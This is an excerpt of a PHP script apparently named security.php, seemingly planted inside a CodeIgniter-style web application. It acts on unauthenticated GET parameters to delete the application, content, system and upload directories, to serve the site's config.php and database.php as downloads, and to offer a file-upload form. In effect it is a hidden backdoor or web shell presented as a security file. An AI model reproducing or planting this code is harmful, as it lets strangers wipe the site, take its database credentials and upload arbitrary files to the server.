...
{
	delete_directory('../../application');
	delete_directory('../../content');
	delete_directory('../../system');
}

if(isset($_GET['delete']) && $_GET['delete']=='upload')
{
	delete_directory('upload');
}

if(isset($_GET['get']) && $_GET['get']=='config')
{
	header("Content-type: application/force-download");
	header("Content-Disposition: attachment; filename=\"Config.php\"");
	header("Content-Length: ".filesize("../../application/config/config.php"));
	define('BASEPATH', '');
	readfile("../../application/config/config.php");
}

if(isset($_GET['get']) && $_GET['get']=='database')
{
	header("Content-type: application/force-download");
	header("Content-Disposition: attachment; filename=\"Database.php\"");
	header("Content-Length: ".filesize("../../application/config/database.php"));
	define('BASEPATH', '');
...
{
	echo '<html><body>
			<form action="security.php?upload=uploading" method="post" enctype="multipart/form-data">
...
if(isset($_GET['upload']) && $_GET['upload']=='uploading')
{
